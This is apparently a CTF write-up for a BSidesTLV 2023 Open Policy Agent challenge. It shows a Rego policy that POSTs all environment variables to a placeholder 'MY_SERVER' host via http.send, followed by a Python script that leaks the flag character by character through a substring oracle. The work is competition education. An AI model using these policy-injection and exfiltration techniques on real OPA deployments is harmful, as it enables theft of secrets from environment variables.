Starting from docker-compose we notice two main services: backend, and opa.
Flag resides under env variable: FLAG under opa.

Backend is an application server written in go. viewing the src code reveals
two main endpoints: /add and /eval.

After some research about OPA (Open Policy Agent -
```https://www.openpolicyagent.org/docs/latest/```) its understandable that
the service allows to create a policy and then evaluate the policy.

On creation, there is a regexp forbidding us from putting in the policy any
char different than: ```a-zA-Z0-9=\s,:[]{}()".``` those characters.

A nice playground i used to get to know the rego (the language used to write
policies): ```https://play.openpolicyagent.org/```.

Since we know that the flag is in the env variable, I started to research how
to access env. variables from a policy, and tackled this post:  
`https://lia.mg/posts/malicious-rego/. `

Sounds promising! let's try to leak the flag via http to our endpoint, by
creating the next policy:

```  
allow {  
   request := {  
       "url": "https://MY_SERVER",  
       "method": "POST",  
       "body": opa.runtime().env,  
   }  
   response := http.send(request)  
}  
```

But unfortunately after countless tries it didn't work.

Spending some time after, continued reading the docs and tackled some builtin
functions on strings which seemed to be very interesting:  
startsWith and substring! Ok, what about leaking each character of the flag by
checking if it starts with something? sounds legit!

let's create the policy:

```  
{  
	"policy": "allow{startswith(opa.runtime().env[\"FLAG\"],\"BSidesTLV2023{\")==true}"  
}  
```

And we get res: true! That's great, but there is problem - once I wrote the
script that leaks each character, when we reach an underscore - we cannot put
it as prefix since the regexp forbids us from using underscore, so instead I
used substring:

```  
{  
	"policy": "a{substring(opa.runtime().env[\"FLAG\"],input.index,1)==input.cand}"  
}  
```

eval allows us to send parameters to the policy as input, so instead of
creating a lot of policies, we create one, and then evaluating it with two
parameters:  
the first is the char index in the flag, and the second is the char itself:

For example,  
```  
https://opa-opa-opa-opa-opa-hei.ctf.bsidestlv.com/eval  
{  
   "uuid": "c180bba7-0609-43db-8d36-e7b0d462e5b6",  
   "input": "{\"input\":{\"index\":0, \"cand\":\"B\"}}"  
}  
```  
returns True!

When the script doesn't find a match for the char, it means that its probably
an under score of some other forbidden character.  
The script:

```  
import requests  
import string  
import json

headers = {"Content-Type": "application/json; charset=UTF-8"}  
payload = {"policy":
"allow{substring(opa.runtime().env[\"FLAG\"],input.index,1)==input.cand}"}  
response = requests.post("https://opa-opa-opa-opa-opa-
hei.ctf.bsidestlv.com/add",  
                        headers=headers,  
                        data=json.dumps(payload))

policy_uuid = json.loads(response.text)

flag_length = 50  
flag = "BSidesTLV2023{"  
allowed_alphabet = string.digits + string.ascii_letters + "}"

for index in range(len(flag), flag_length, 1):  
   found = False  
   for cand in allowed_alphabet:  
       payload = {  
           "uuid": policy_uuid["uuid"],  
           "input": json.dumps({"input": {"index": index, "cand": cand}})  
       }  
       res = requests.post("https://opa-opa-opa-opa-opa-hei.ctf.bsidestlv.com/eval",  
                           headers=headers,  
                           data=json.dumps(payload))

       found = json.loads(res.text)["res"]  
       if found:  
           flag += cand  
           print(f"Found: {flag}")  
           if cand == "}":  
               print("Done")  
               exit(0)  
           break

   if not found:  
       flag += "?"  
```

Now we are left with some guessing:

`BSidesTLV2023{0paOpaoPaop?H3i?Policy3vAL}`

`BSidesTLV2023{0paOpaoPaop?H3i_Policy3vAL}`

`BSidesTLV2023{0paOpaoPaop_H3i_Policy3vAL}`

`BSidesTLV2023{0paOpaoPaopaH3i_Policy3vAL}`

`BSidesTLV2023{0paOpaoPaopAH3i_Policy3vAL}`

`BSidesTLV2023{0paOpaoPaop4H3i_Policy3vAL}`

`BSidesTLV2023{0paOpaoPaop@H3i_Policy3vAL}` correct!

captainB  
CamelRiders